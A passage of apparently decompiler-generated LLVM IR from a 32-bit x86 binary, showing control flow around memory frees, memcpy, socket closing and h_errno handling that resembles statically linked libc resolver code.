  %v12_804c4b3 = icmp eq i32 %v3_804c4a9, 28
  %v1_804c4bb = icmp eq i1 %v12_804c4b3, false
  br i1 %v1_804c4bb, label %dec_label_pc_804c55e, label %dec_label_pc_804c4c1

dec_label_pc_804c4c1:                             ; preds = %dec_label_pc_804c468.dec_label_pc_804c4c1_crit_edge, %dec_label_pc_804c4b3, %dec_label_pc_804c4a9
  %v4_804c4c1 = phi i32 [ %v4_804c4c1.pre, %dec_label_pc_804c468.dec_label_pc_804c4c1_crit_edge ], [ %v3_804c4a9, %dec_label_pc_804c4b3 ], [ %v3_804c4a9, %dec_label_pc_804c4a9 ]
  %v15_804c4c1 = icmp eq i32 %v3_804c494, %v4_804c4c1
  br i1 %v15_804c4c1, label %dec_label_pc_804c4d6, label %dec_label_pc_804c4ca

dec_label_pc_804c4ca:                             ; preds = %dec_label_pc_804c4c1
  %v1_804c4cd = inttoptr i32 %v0_804c494 to i32*
  %v2_804c4cd = load i32, i32* %v1_804c4cd, align 4
  %v5_804c4cd = inttoptr i32 %v0_804c497 to i32*
  store i32 %v2_804c4cd, i32* %v5_804c4cd, align 4
  %v1_804c4cf = call i32 @free(i32 -1)
  store i32 %v1_804c4cf, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c546

dec_label_pc_804c4d6:                             ; preds = %dec_label_pc_804c4c1
  %v0_804c4d6 = load i32, i32* @ebx, align 4
  %v1_804c4d8 = sub i32 -1, %v0_804c4d6
  store i32 %v1_804c4d8, i32* %eax.global-to-local, align 4
  %v2_804c4da = add i32 %v0_804c497, 120
  %v3_804c4da = inttoptr i32 %v2_804c4da to i32*
  %v4_804c4da = load i32, i32* %v3_804c4da, align 4
  %v5_804c4da = add i32 %v4_804c4da, %v1_804c4d8
  store i32 %v5_804c4da, i32* %eax.global-to-local, align 4
  %v2_804c4de = add i32 %v0_804c494, 36
  %v3_804c4de = inttoptr i32 %v2_804c4de to i32*
  store i32 %v5_804c4da, i32* %v3_804c4de, align 4
  %v0_804c4e1 = load i32, i32* @edi, align 4
  %v1_804c4e1 = add i32 %v0_804c4e1, 16
  %v2_804c4e1 = inttoptr i32 %v1_804c4e1 to i32*
  %v3_804c4e1 = load i32, i32* %v2_804c4e1, align 4
  %v1_804c4e4 = add i32 %v3_804c4e1, 4
  store i32 %v1_804c4e4, i32* %eax.global-to-local, align 4
  %v2_804c4e7 = add i32 %v0_804c4e1, 36
  %v3_804c4e7 = inttoptr i32 %v2_804c4e7 to i32*
  %v4_804c4e7 = load i32, i32* %v3_804c4e7, align 4
  %v7_804c4e7 = mul i32 %v4_804c4e7, %v1_804c4e4
  store i32 %v7_804c4e7, i32* %eax.global-to-local, align 4
  %v2_804c4eb = add i32 %v0_804c4e1, 32
  %v3_804c4eb = inttoptr i32 %v2_804c4eb to i32*
  %v4_804c4eb = load i32, i32* %v3_804c4eb, align 4
  %v6_804c4ee = icmp ugt i32 %v7_804c4e7, %v4_804c4eb
  br i1 %v6_804c4ee, label %dec_label_pc_804c4d6.dec_label_pc_804c55e.loopexit_crit_edge, label %dec_label_pc_804c4f0

dec_label_pc_804c4d6.dec_label_pc_804c55e.loopexit_crit_edge: ; preds = %dec_label_pc_804c4d6
  %v0_804c55e.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c55e

dec_label_pc_804c4f0:                             ; preds = %dec_label_pc_804c4d6
  store i32 0, i32* %v3_804c4e7, align 4
  %v0_804c4f7 = load i32, i32* @esp, align 4
  %v1_804c4f7 = add i32 %v0_804c4f7, 27
  %v2_804c4f7 = inttoptr i32 %v1_804c4f7 to i8*
  store i8 0, i8* %v2_804c4f7, align 1
  %v1_804c549.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c549

dec_label_pc_804c4fe:                             ; preds = %dec_label_pc_804c45d
  %v1_804c501 = add i32 %v0_804c43e, 132
  %v2_804c501 = inttoptr i32 %v1_804c501 to i32*
  %v3_804c501 = load i32, i32* %v2_804c501, align 4
  %v6_804c501 = inttoptr i32 %v0_804c43e to i32*
  store i32 %v3_804c501, i32* %v6_804c501, align 4
  %v1_804c508 = call i32 @free(i32 -1)
  store i32 %v1_804c508, i32* %eax.global-to-local, align 4
  %v0_804c50d = load i32, i32* @esp, align 4
  %v1_804c50d = add i32 %v0_804c50d, 16
  %v1_804c510 = add i32 %v0_804c50d, 260
  %v2_804c510 = inttoptr i32 %v1_804c510 to i32*
  %v3_804c510 = load i32, i32* %v2_804c510, align 4
  store i32 %v3_804c510, i32* %eax.global-to-local, align 4
  %v1_804c517 = add i32 %v0_804c50d, 136
  %v2_804c517 = inttoptr i32 %v1_804c517 to i32*
  %v3_804c517 = load i32, i32* %v2_804c517, align 4
  %v15_804c517 = icmp eq i32 %v3_804c517, %v3_804c510
  %v1_804c51b = icmp eq i1 %v15_804c517, false
  br i1 %v1_804c51b, label %dec_label_pc_804c549, label %dec_label_pc_804c51d

dec_label_pc_804c51d:                             ; preds = %dec_label_pc_804c4fe
  %v0_804c51d = load i32, i32* @edi, align 4
  %v1_804c51d = add i32 %v0_804c51d, 16
  %v2_804c51d = inttoptr i32 %v1_804c51d to i32*
  %v3_804c51d = load i32, i32* %v2_804c51d, align 4
  store i32 %v3_804c51d, i32* %eax.global-to-local, align 4
  %v2_804c520 = add i32 %v0_804c50d, 148
  %v3_804c520 = inttoptr i32 %v2_804c520 to i32*
  %v4_804c520 = load i32, i32* %v3_804c520, align 4
  %v15_804c520 = icmp eq i32 %v3_804c51d, %v4_804c520
  %v1_804c527 = icmp eq i1 %v15_804c520, false
  br i1 %v1_804c527, label %dec_label_pc_804c5e3, label %dec_label_pc_804c52d

dec_label_pc_804c52d:                             ; preds = %dec_label_pc_804c51d
  %v0_804c52d = load i32, i32* @edx, align 4
  %v2_804c52d = add i32 %v0_804c50d, 12
  %v3_804c52d = inttoptr i32 %v2_804c52d to i32*
  store i32 %v0_804c52d, i32* %v3_804c52d, align 4
  %v0_804c52e = load i32, i32* %eax.global-to-local, align 4
  %v2_804c52e = add i32 %v0_804c50d, 8
  %v3_804c52e = inttoptr i32 %v2_804c52e to i32*
  store i32 %v0_804c52e, i32* %v3_804c52e, align 4
  %v1_804c52f = add i32 %v0_804c50d, 152
  %v2_804c52f = inttoptr i32 %v1_804c52f to i32*
  %v3_804c52f = load i32, i32* %v2_804c52f, align 4
  %v5_804c52f = add i32 %v0_804c50d, 4
  %v6_804c52f = inttoptr i32 %v5_804c52f to i32*
  store i32 %v3_804c52f, i32* %v6_804c52f, align 4
  %v0_804c536 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c536 = load i32, i32* @edi, align 4
  %v2_804c536 = add i32 %v1_804c536, 36
  %v3_804c536 = inttoptr i32 %v2_804c536 to i32*
  %v4_804c536 = load i32, i32* %v3_804c536, align 4
  %v7_804c536 = mul i32 %v4_804c536, %v0_804c536
  store i32 %v7_804c536, i32* %eax.global-to-local, align 4
  %v2_804c53a = add i32 %v1_804c536, 28
  %v3_804c53a = inttoptr i32 %v2_804c53a to i32*
  %v4_804c53a = load i32, i32* %v3_804c53a, align 4
  %v5_804c53a = add i32 %v4_804c53a, %v7_804c536
  store i32 %v5_804c53a, i32* %eax.global-to-local, align 4
  %v3_804c53d = inttoptr i32 %v0_804c50d to i32*
  store i32 %v5_804c53a, i32* %v3_804c53d, align 4
  %v4_804c53e = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_804c07c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c53e, i32* %eax.global-to-local, align 4
  %v0_804c543 = load i32, i32* @edi, align 4
  %v1_804c543 = add i32 %v0_804c543, 36
  %v2_804c543 = inttoptr i32 %v1_804c543 to i32*
  %v3_804c543 = load i32, i32* %v2_804c543, align 4
  %v4_804c543 = add i32 %v3_804c543, 1
  store i32 %v4_804c543, i32* %v2_804c543, align 4
  br label %dec_label_pc_804c546

dec_label_pc_804c546:                             ; preds = %dec_label_pc_804c4ca, %dec_label_pc_804c52d
  %v0_804c546 = load i32, i32* @esp, align 4
  %v1_804c546 = add i32 %v0_804c546, 16
  br label %dec_label_pc_804c549

dec_label_pc_804c549:                             ; preds = %dec_label_pc_804c4fe, %dec_label_pc_804c4f0, %dec_label_pc_804c546
  %v1_804c549 = phi i32 [ %v1_804c50d, %dec_label_pc_804c4fe ], [ %v1_804c549.pre, %dec_label_pc_804c4f0 ], [ %v1_804c546, %dec_label_pc_804c546 ]
  %v0_804c549 = load i32, i32* @esi, align 4
  %v2_804c549 = add i32 %v1_804c549, 52
  %v3_804c549 = inttoptr i32 %v2_804c549 to i32*
  %v4_804c549 = load i32, i32* %v3_804c549, align 4
  %v5_804c549 = add i32 %v4_804c549, %v0_804c549
  store i32 %v5_804c549, i32* @esi, align 4
  %v0_804c54d = load i32, i32* @ebx, align 4
  %v1_804c54d = add i32 %v0_804c54d, 1
  store i32 %v1_804c54d, i32* @ebx, align 4
  %v2_804c54e = add i32 %v1_804c549, 104
  %v3_804c54e = inttoptr i32 %v2_804c54e to i32*
  %v4_804c54e = load i32, i32* %v3_804c54e, align 4
  %v5_804c54e = sub i32 %v1_804c54d, %v4_804c54e
  %v11_804c54e = xor i32 %v4_804c54e, %v1_804c54d
  %v12_804c54e = xor i32 %v5_804c54e, %v1_804c54d
  %v13_804c54e = and i32 %v12_804c54e, %v11_804c54e
  %v14_804c54e = icmp slt i32 %v13_804c54e, 0
  %v16_804c54e = icmp slt i32 %v5_804c54e, 0
  %v2_804c552 = icmp eq i1 %v16_804c54e, %v14_804c54e
  br i1 %v2_804c552, label %dec_label_pc_804c55e, label %dec_label_pc_804c554

dec_label_pc_804c554:                             ; preds = %dec_label_pc_804c554.lr.ph, %dec_label_pc_804c549
  %v0_804c554 = phi i32 [ %v0_804c554.pre, %dec_label_pc_804c554.lr.ph ], [ %v5_804c549, %dec_label_pc_804c549 ]
  %v0_804c42a81 = phi i32 [ %v1_804c54e.pre, %dec_label_pc_804c554.lr.ph ], [ %v1_804c549, %dec_label_pc_804c549 ]
  %v2_804c554 = add i32 %v0_804c42a81, 16
  %v3_804c554 = inttoptr i32 %v2_804c554 to i32*
  %v4_804c554 = load i32, i32* %v3_804c554, align 4
  %v5_804c554 = sub i32 %v0_804c554, %v4_804c554
  %v11_804c554 = xor i32 %v4_804c554, %v0_804c554
  %v12_804c554 = xor i32 %v5_804c554, %v0_804c554
  %v13_804c554 = and i32 %v12_804c554, %v11_804c554
  %v14_804c554 = icmp slt i32 %v13_804c554, 0
  %v16_804c554 = icmp slt i32 %v5_804c554, 0
  %v2_804c558 = icmp eq i1 %v16_804c554, %v14_804c554
  br i1 %v2_804c558, label %dec_label_pc_804c55e, label %dec_label_pc_804c42a

dec_label_pc_804c55e:                             ; preds = %dec_label_pc_804c44d, %dec_label_pc_804c41e, %dec_label_pc_804c549, %dec_label_pc_804c49f, %dec_label_pc_804c4b3, %dec_label_pc_804c554, %dec_label_pc_804c4d6.dec_label_pc_804c55e.loopexit_crit_edge
  %v0_804c55e = phi i32 [ %v0_804c55e.pre.pre, %dec_label_pc_804c4d6.dec_label_pc_804c55e.loopexit_crit_edge ], [ %v1_804c54e.pre, %dec_label_pc_804c41e ], [ %v1_804c549, %dec_label_pc_804c549 ], [ %v1_804c497, %dec_label_pc_804c49f ], [ %v1_804c497, %dec_label_pc_804c4b3 ], [ %v0_804c42a81, %dec_label_pc_804c554 ], [ %v1_804c43e, %dec_label_pc_804c44d ]
  %v1_804c561 = add i32 %v0_804c55e, 20
  %v2_804c561 = inttoptr i32 %v1_804c561 to i32*
  %v3_804c561 = load i32, i32* %v2_804c561, align 4
  %v5_804c561 = add i32 %v0_804c55e, -16
  %v6_804c561 = inttoptr i32 %v5_804c561 to i32*
  store i32 %v3_804c561, i32* %v6_804c561, align 4
  %v1_804c565 = call i32 @__libc_close(i32 -1)
  store i32 %v1_804c565, i32* %eax.global-to-local, align 4
  %v0_804c56a = load i32, i32* @esp, align 4
  %v1_804c56d = add i32 %v0_804c56a, 272
  %v2_804c56d = inttoptr i32 %v1_804c56d to i32*
  %v3_804c56d = load i32, i32* %v2_804c56d, align 4
  %v4_804c56d = icmp eq i32 %v3_804c56d, 0
  br i1 %v4_804c56d, label %dec_label_pc_804c582, label %dec_label_pc_804c577

dec_label_pc_804c577:                             ; preds = %dec_label_pc_804c55e
  store i32 %v3_804c56d, i32* %edx.global-to-local, align 4
  %v2_804c57e = inttoptr i32 %v3_804c56d to i32*
  store i32 %v2_804bfee, i32* %v2_804c57e, align 4
  %v0_804c58e.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c58e

dec_label_pc_804c582:                             ; preds = %dec_label_pc_804c55e
  %v3_804c585 = inttoptr i32 %v0_804c56a to i32*
  store i32 %v2_804bfee, i32* %v3_804c585, align 4
  %v1_804c586 = call i32 @free(i32 -1)
  store i32 %v1_804c586, i32* %eax.global-to-local, align 4
  %v0_804c58b = load i32, i32* @esp, align 4
  %v1_804c58b = add i32 %v0_804c58b, 16
  br label %dec_label_pc_804c58e

dec_label_pc_804c58e:                             ; preds = %dec_label_pc_804c577, %dec_label_pc_804c582
  %v0_804c58e = phi i32 [ %v0_804c58e.pre, %dec_label_pc_804c577 ], [ %v1_804c58b, %dec_label_pc_804c582 ]
  %v1_804c591 = add i32 %v0_804c58e, 12
  %v2_804c591 = inttoptr i32 %v1_804c591 to i32*
  %v3_804c591 = load i32, i32* %v2_804c591, align 4
  %v5_804c591 = add i32 %v0_804c58e, -16
  %v6_804c591 = inttoptr i32 %v5_804c591 to i32*
  store i32 %v3_804c591, i32* %v6_804c591, align 4
  %v1_804c595 = call i32 @free(i32 -1)
  store i32 %v1_804c595, i32* @eax, align 4
  %v0_804c59a = load i32, i32* @esp, align 4
  %v1_804c59d = add i32 %v0_804c59a, 8
  %v2_804c59d = inttoptr i32 %v1_804c59d to i32*
  store i32 ptrtoint (i8** @global_var_8052528.84 to i32), i32* %v2_804c59d, align 4
  %v1_804c5a2 = add i32 %v0_804c59a, 4
  %v2_804c5a2 = inttoptr i32 %v1_804c5a2 to i32*
  store i32 134526883, i32* %v2_804c5a2, align 4
  %v1_804c5a7 = add i32 %v0_804c59a, 200
  store i32 %v1_804c5a7, i32* %ebx.global-to-local, align 4
  %v3_804c5ae = inttoptr i32 %v0_804c59a to i32*
  store i32 %v1_804c5a7, i32* %v3_804c5ae, align 4
  %v2_804c5af = call i32 @__pthread_return_void(i32 -1, i32 %v15_804c07c)
  store i32 %v2_804c5af, i32* %eax.global-to-local, align 4
  %v0_804c5b4 = load i32, i32* @esp, align 4
  %v1_804c5b4 = inttoptr i32 %v0_804c5b4 to i32*
  store i32 ptrtoint (i8** @global_var_8052528.84 to i32), i32* %v1_804c5b4, align 4
  %v1_804c5bb = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_804c5bb, i32* %eax.global-to-local, align 4
  %v0_804c5c0 = load i32, i32* @esp, align 4
  %v1_804c5c0 = add i32 %v0_804c5c0, 56
  %v2_804c5c0 = inttoptr i32 %v1_804c5c0 to i32*
  %v3_804c5c0 = load i32, i32* %v2_804c5c0, align 4
  store i32 %v3_804c5c0, i32* @eax, align 4
  %v1_804c5c4 = add i32 %v0_804c5c0, 60
  %v2_804c5c4 = inttoptr i32 %v1_804c5c4 to i32*
  %v3_804c5c4 = load i32, i32* %v2_804c5c4, align 4
  store i32 %v3_804c5c4, i32* %edx.global-to-local, align 4
  %v1_804c5c8 = inttoptr i32 %v0_804c5c0 to i32*
  %v3_804c5c8 = add i32 %v0_804c5c0, 4
  %v1_804c5c9 = inttoptr i32 %v3_804c5c8 to i32*
  %v1_804c5ca = sext i32 %v3_804c5c0 to i64
  store i64 %v1_804c5ca, i64* @global_var_8052540.85, align 64
  %v1_804c5cf = trunc i32 %v3_804c5c4 to i16
  store i16 %v1_804c5cf, i16* @global_var_805215c.86, align 4
  store i32 1, i32* %v1_804c5c9, align 4
  %v0_804c5d8 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804c5d8, i32* %v1_804c5c8, align 4
  %v2_804c5d9 = call i32 @__pthread_return_void(i32 -1, i32 %v15_804c07c)
  store i32 %v2_804c5d9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c71a

dec_label_pc_804c5e3:                             ; preds = %dec_label_pc_804c51d
  %v1_804c5e6 = inttoptr i32 %v0_804c51d to i32*
  %v2_804c5e6 = load i32, i32* %v1_804c5e6, align 4
  %v5_804c5e6 = inttoptr i32 %v0_804c50d to i32*
  store i32 %v2_804c5e6, i32* %v5_804c5e6, align 4
  %v1_804c5e8 = call i32 @free(i32 -1)
  store i32 %v1_804c5e8, i32* @eax, align 4
  %v0_804c5ed = load i32, i32* @esp, align 4
  %v1_804c5ed = add i32 %v0_804c5ed, 16
  br label %dec_label_pc_804c5f0

dec_label_pc_804c5f0:                             ; preds = %dec_label_pc_804c322, %dec_label_pc_804c44d, %dec_label_pc_804c445, %dec_label_pc_804c3e1, %dec_label_pc_804c367, %dec_label_pc_804c343, %dec_label_pc_804c5e3
  %v1_804c5f7 = phi i32 [ %v1_804c337, %dec_label_pc_804c322 ], [ %v1_804c43e, %dec_label_pc_804c44d ], [ %v1_804c43e, %dec_label_pc_804c445 ], [ %v1_804c358, %dec_label_pc_804c3e1 ], [ %v1_804c358, %dec_label_pc_804c367 ], [ %v1_804c358, %dec_label_pc_804c343 ], [ %v1_804c5ed, %dec_label_pc_804c5e3 ]
  %v1_804c5f0 = add i32 %v1_804c5f7, 51
  %v2_804c5f0 = inttoptr i32 %v1_804c5f0 to i8*
  %v3_804c5f0 = load i8, i8* %v2_804c5f0, align 1
  %v4_804c5f0 = icmp eq i8 %v3_804c5f0, 0
  %v1_804c5f5 = icmp eq i1 %v4_804c5f0, false
  br i1 %v1_804c5f5, label %dec_label_pc_804c63b, label %dec_label_pc_804c5f7

dec_label_pc_804c5f7:                             ; preds = %dec_label_pc_804c5f0
  %v0_804c5f7 = load i32, i32* @ecx, align 4
  %v2_804c5f7 = add i32 %v1_804c5f7, -4
  %v3_804c5f7 = inttoptr i32 %v2_804c5f7 to i32*
  store i32 %v0_804c5f7, i32* %v3_804c5f7, align 4
  %v1_804c5f8 = add i32 %v1_804c5f7, -8
  %v2_804c5f8 = inttoptr i32 %v1_804c5f8 to i32*
  store i32 ptrtoint (i32* @global_var_8052160.32 to i32), i32* %v2_804c5f8, align 4
  %v1_804c5fd = add i32 %v1_804c5f7, -12
  %v2_804c5fd = inttoptr i32 %v1_804c5fd to i32*
  store i32 134526883, i32* %v2_804c5fd, align 4
  %v1_804c602 = add i32 %v1_804c5f7, 184
  store i32 %v1_804c602, i32* @esi, align 4
  %v2_804c609 = add i32 %v1_804c5f7, -16
  %v3_804c609 = inttoptr i32 %v2_804c609 to i32*
  store i32 %v1_804c602, i32* %v3_804c609, align 4
  %v2_804c60a = call i32 @__pthread_return_void(i32 -1, i32 %v15_804c07c)
  store i32 %v2_804c60a, i32* %eax.global-to-local, align 4
  %v0_804c60f = load i32, i32* @esp, align 4
  %v1_804c60f = inttoptr i32 %v0_804c60f to i32*
  store i32 ptrtoint (i32* @global_var_8052160.32 to i32), i32* %v1_804c60f, align 4
  %v1_804c616 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_804c616, i32* %eax.global-to-local, align 4
  %v0_804c61b = load i32, i32* @global_var_8054998.87, align 8
  store i32 %v0_804c61b, i32* %ebx.global-to-local, align 4
  %v0_804c621 = load i32, i32* @esp, align 4
  %v1_804c621 = inttoptr i32 %v0_804c621 to i32*
  %v2_804c621 = load i32, i32* %v1_804c621, align 4
  store i32 %v2_804c621, i32* @eax, align 4
  %v3_804c621 = add i32 %v0_804c621, 4
  %v1_804c622 = inttoptr i32 %v3_804c621 to i32*
  %v2_804c622 = load i32, i32* %v1_804c622, align 4
  store i32 %v2_804c622, i32* %edx.global-to-local, align 4
  %v1_804c623 = add i32 %v0_804c61b, -1
  store i32 %v1_804c623, i32* @ebx, align 4
  store i32 1, i32* %v1_804c622, align 4
  %v0_804c626 = load i32, i32* @esi, align 4
  store i32 %v0_804c626, i32* %v1_804c621, align 4
  %v2_804c627 = call i32 @__pthread_return_void(i32 -1, i32 %v15_804c07c)
  store i32 %v2_804c627, i32* %eax.global-to-local, align 4
  %v0_804c62c = load i32, i32* @esp, align 4
  %v1_804c62c = add i32 %v0_804c62c, 16
  %v1_804c62f = add i32 %v0_804c62c, 52
  %v2_804c62f = inttoptr i32 %v1_804c62f to i32*
  %v3_804c62f = load i32, i32* %v2_804c62f, align 4
  %v4_804c62f = load i32, i32* @ebx, align 4
  %v5_804c62f = sub i32 %v3_804c62f, %v4_804c62f
  %v11_804c62f = xor i32 %v4_804c62f, %v3_804c62f
  %v12_804c62f = xor i32 %v5_804c62f, %v3_804c62f
  %v13_804c62f = and i32 %v12_804c62f, %v11_804c62f
  %v14_804c62f = icmp slt i32 %v13_804c62f, 0
  %v16_804c62f = icmp slt i32 %v5_804c62f, 0
  %v2_804c633 = icmp eq i1 %v16_804c62f, %v14_804c62f
  br i1 %v2_804c633, label %dec_label_pc_804c63b, label %dec_label_pc_804c635

dec_label_pc_804c635:                             ; preds = %dec_label_pc_804c5f7
  %v4_804c635 = add i32 %v3_804c62f, 1
  store i32 %v4_804c635, i32* %v2_804c62f, align 4
  br label %dec_label_pc_804c65c.backedge

dec_label_pc_804c63b:                             ; preds = %dec_label_pc_804c2c4, %dec_label_pc_804c5f7, %dec_label_pc_804c5f0, %dec_label_pc_804c2db
  %v1_804c64a = phi i32 [ %v1_804c62c, %dec_label_pc_804c5f7 ], [ %v1_804c5f7, %dec_label_pc_804c5f0 ], [ %v1_804c317, %dec_label_pc_804c2db ], [ %v0_804c63b.pre, %dec_label_pc_804c2c4 ]
  %v1_804c63b = add i32 %v1_804c64a, 40
  %v2_804c63b = inttoptr i32 %v1_804c63b to i32*
  %v3_804c63b = load i32, i32* %v2_804c63b, align 4
  %v1_804c63f = add i32 %v3_804c63b, 1
  store i32 %v1_804c63f, i32* %eax.global-to-local, align 4
  %v1_804c640 = ashr i32 %v1_804c63f, 31
  store i32 %v1_804c640, i32* %edx.global-to-local, align 4
  %v1_804c641 = add i32 %v1_804c64a, 248
  %v2_804c641 = inttoptr i32 %v1_804c641 to i32*
  %v3_804c641 = load i32, i32* %v2_804c641, align 4
  %v5_804c641 = zext i32 %v1_804c63f to i64
  %v7_804c641 = zext i32 %v1_804c640 to i64
  %v8_804c641 = mul nuw i64 %v7_804c641, 4294967296
  %v9_804c641 = or i64 %v8_804c641, %v5_804c641
  %v10_804c641 = zext i32 %v3_804c641 to i64
  %v11_804c641 = sdiv i64 %v9_804c641, %v10_804c641
  %v12_804c641 = trunc i64 %v11_804c641 to i32
  store i32 %v12_804c641, i32* %eax.global-to-local, align 4
  %v13_804c641 = srem i64 %v9_804c641, %v10_804c641
  %v14_804c641 = trunc i64 %v13_804c641 to i32
  store i32 %v14_804c641, i32* %edx.global-to-local, align 4
  %v1_804c648 = icmp eq i32 %v14_804c641, 0
  store i32 %v14_804c641, i32* %v2_804c63b, align 4
  %v1_804c64e = icmp eq i1 %v1_804c648, false
  br i1 %v1_804c64e, label %dec_label_pc_804c654, label %dec_label_pc_804c650

dec_label_pc_804c650:                             ; preds = %dec_label_pc_804c63b
  %v0_804c650 = load i32, i32* @esp, align 4
  %v1_804c650 = add i32 %v0_804c650, 28
  %v2_804c650 = inttoptr i32 %v1_804c650 to i32*
  %v3_804c650 = load i32, i32* %v2_804c650, align 4
  %v4_804c650 = add i32 %v3_804c650, 1
  store i32 %v4_804c650, i32* %v2_804c650, align 4
  br label %dec_label_pc_804c654

dec_label_pc_804c654:                             ; preds = %dec_label_pc_804c63b, %dec_label_pc_804c650
  %v0_804c654 = load i32, i32* @esp, align 4
  %v1_804c654 = add i32 %v0_804c654, 36
  %v2_804c654 = inttoptr i32 %v1_804c654 to i32*
  store i32 -1, i32* %v2_804c654, align 4
  br label %dec_label_pc_804c65c.backedge

dec_label_pc_804c65c.backedge:                    ; preds = %dec_label_pc_804c654, %dec_label_pc_804c2d2, %dec_label_pc_804c3c0, %dec_label_pc_804c635
  %v0_804c65c.pre = load i32, i32* @esp, align 4
  %v1_804c65c = add i32 %v0_804c65c.pre, 28
  %v2_804c65c = inttoptr i32 %v1_804c65c to i32*
  %v3_804c65c = load i32, i32* %v2_804c65c, align 4
  %tmp122 = icmp ult i32 %v3_804c65c, 3
  br i1 %tmp122, label %dec_label_pc_804c0bc, label %dec_label_pc_804c681

dec_label_pc_804c681:                             ; preds = %dec_label_pc_804c036, %dec_label_pc_804c0d2, %dec_label_pc_804c1c6, %dec_label_pc_804c65c.backedge, %entry, %dec_label_pc_804c010, %dec_label_pc_804c018, %dec_label_pc_804c026
  %stack_var_-180.0 = phi i16 [ -1, %dec_label_pc_804c026 ], [ -1, %dec_label_pc_804c018 ], [ -1, %dec_label_pc_804c010 ], [ -1, %entry ], [ %v0_804c083, %dec_label_pc_804c65c.backedge ], [ %v0_804c083, %dec_label_pc_804c1c6 ], [ %v0_804c083, %dec_label_pc_804c0d2 ], [ %v0_804c083, %dec_label_pc_804c036 ]
  %v0_804c681 = call i32 @__GI___h_errno_location()
  store i32 %v0_804c681, i32* %eax.global-to-local, align 4
  %v1_804c686 = inttoptr i32 %v0_804c681 to i32*
  store i32 -1, i32* %v1_804c686, align 4
  %v0_804c68c = load i32, i32* @esp, align 4
  %v1_804c68c = add i32 %v0_804c68c, 56
  %v2_804c68c = inttoptr i32 %v1_804c68c to i32*
  %v3_804c68c = load i32, i32* %v2_804c68c, align 4
  store i32 %v3_804c68c, i32* %eax.global-to-local, align 4
  %v2_804c690 = add i32 %v0_804c68c, 44
  %v3_804c690 = inttoptr i32 %v2_804c690 to i32*
  store i32 %v3_804c68c, i32* %v3_804c690, align 4
  br label %dec_label_pc_804c694

dec_label_pc_804c694:                             ; preds = %dec_label_pc_804c3f9, %dec_label_pc_804c3d1, %dec_label_pc_804c681
  %stack_var_-180.1 = phi i16 [ %stack_var_-180.0, %dec_label_pc_804c681 ], [ %v0_804c083, %dec_label_pc_804c3f9 ], [ %v0_804c083, %dec_label_pc_804c3d1 ]
  %v0_804c694 = load i32, i32* @esp, align 4
  %v1_804c694 = add i32 %v0_804c694, 20
  %v2_804c694 = inttoptr i32 %v1_804c694 to i32*
  %v3_804c694 = load i32, i32* %v2_804c694, align 4
  %v13_804c694 = icmp eq i32 %v3_804c694, -1
  br i1 %v13_804c694, label %dec_label_pc_804c694.dec_label_pc_804c6aa_crit_edge, label %dec_label_pc_804c69b

dec_label_pc_804c694.dec_label_pc_804c6aa_crit_edge: ; preds = %dec_label_pc_804c694
  %.pre = sext i16 %stack_var_-180.1 to i32
  br label %dec_label_pc_804c6aa

dec_label_pc_804c69b:                             ; preds = %dec_label_pc_804c694
  %v3_804c69e = load i32, i32* %v2_804c694, align 4
  %v5_804c69e = add i32 %v0_804c694, -16
  %v6_804c69e = inttoptr i32 %v5_804c69e to i32*
  store i32 %v3_804c69e, i32* %v6_804c69e, align 4
  %v1_804c6a2 = sext i16 %stack_var_-180.1 to i32
  %v2_804c6a2 = call i32 @__libc_close(i32 %v1_804c6a2)
  store i32 %v2_804c6a2, i32* %eax.global-to-local, align 4
  %v0_804c6a7 = load i32, i32* @esp, align 4
  %v1_804c6a7 = add i32 %v0_804c6a7, 16
  br label %dec_label_pc_804c6aa

dec_label_pc_804c6aa:                             ; preds = %dec_label_pc_804c694.dec_label_pc_804c6aa_crit_edge, %dec_label_pc_804c69b
  %v1_804c6b1.pre-phi = phi i32 [ %.pre, %dec_label_pc_804c694.dec_label_pc_804c6aa_crit_edge ], [ %v1_804c6a2, %dec_label_pc_804c69b ]
  %v0_804c6aa = phi i32 [ %v0_804c694, %dec_label_pc_804c694.dec_label_pc_804c6aa_crit_edge ], [ %v1_804c6a7, %dec_label_pc_804c69b ]
  %v1_804c6ad = add i32 %v0_804c6aa, 12
  %v2_804c6ad = inttoptr i32 %v1_804c6ad to i32*
  %v3_804c6ad = load i32, i32* %v2_804c6ad, align 4
  %v5_804c6ad = add i32 %v0_804c6aa, -16
  %v6_804c6ad = inttoptr i32 %v5_804c6ad to i32*
  store i32 %v3_804c6ad, i32* %v6_804c6ad, align 4
  %v2_804c6b1 = call i32 @free(i32 %v1_804c6b1.pre-phi)
  store i32 %v2_804c6b1, i32* %eax.global-to-local, align 4
  %v1_804c6b6 = load i32, i32* @esp, align 4
  %v2_804c6b6 = inttoptr i32 %v1_804c6b6 to i32*
  store i32 %v2_804bfee, i32* %v2_804c6b6, align 4
  %v2_804c6b9 = call i32 @free(i32 %v1_804c6b1.pre-phi)
  store i32 %v2_804c6b9, i32* @eax, align 4
  %v0_804c6be = load i32, i32* @esp, align 4
  %v1_804c6c1 = add i32 %v0_804c6be, 56
  %v2_804c6c1 = inttoptr i32 %v1_804c6c1 to i32*
  %v3_804c6c1 = load i32, i32* %v2_804c6c1, align 4
  %v13_804c6c1 = icmp eq i32 %v3_804c6c1, -1
  %v1_804c6c6 = add i32 %v0_804c6be, 32
  %v2_804c6c6 = inttoptr i32 %v1_804c6c6 to i32*
  store i32 -1, i32* %v2_804c6c6, align 4
  br i1 %v13_804c6c1, label %dec_label_pc_804c6aa.dec_label_pc_804c71d_crit_edge, label %dec_label_pc_804c6d0

dec_label_pc_804c6aa.dec_label_pc_804c71d_crit_edge: ; preds = %dec_label_pc_804c6aa
  %v0_804c71d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c71d

dec_label_pc_804c6d0:                             ; preds = %dec_label_pc_804c6aa
  %v0_804c6d0 = load i32, i32* @ecx, align 4
  %v1_804c6d0 = load i32, i32* @esp, align 4
